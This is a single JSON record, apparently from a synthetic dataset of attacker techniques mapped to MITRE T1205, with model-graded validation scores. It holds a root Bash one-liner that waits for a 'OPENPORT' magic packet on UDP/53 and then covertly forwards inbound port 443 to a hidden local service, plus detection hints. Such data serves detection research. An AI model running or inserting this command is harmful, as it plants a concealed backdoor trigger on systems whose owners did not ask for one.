@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i en0 -c 1 \"udp dst port 53 and udp[8:4] = 0x4f50454e and udp[12:4] = 0x504f5254\" >/dev/null && ipfw add 310 fwd 127.0.0.1,9001 tcp from any to me 443 in; sleep 120; ipfw delete 310'",
+  "explanation": "Waits for a DNS-port (UDP/53) magic payload \"OPENPORT\", then installs an ipfw forward rule to silently redirect inbound TCP/443 to local 127.0.0.1:9001 for 120 seconds. Requires sudo/root.",
+  "rationale_steps": [
+    "Abuse a UDP magic packet as the trigger (port knocking-like signal).",
+    "Use ipfw fwd to covertly repoint inbound TLS traffic to a hidden local service.",
+    "Detection: inspect ipfw for transient fwd rules; IDS rules for UDP/53 with non-DNS payload; TLS service anomalies on host."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-6be40adb",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command uses balanced quoting, valid tcpdump filter syntax, proper operators (&& and ;) and well-formed ipfw arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It waits for a UDP/53 magic payload then adds a temporary ipfw forward rule as a covert trigger, but depends on ipfw (deprecated on modern macOS) and the payload is not DNS-like, slightly reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:58:20.944310Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
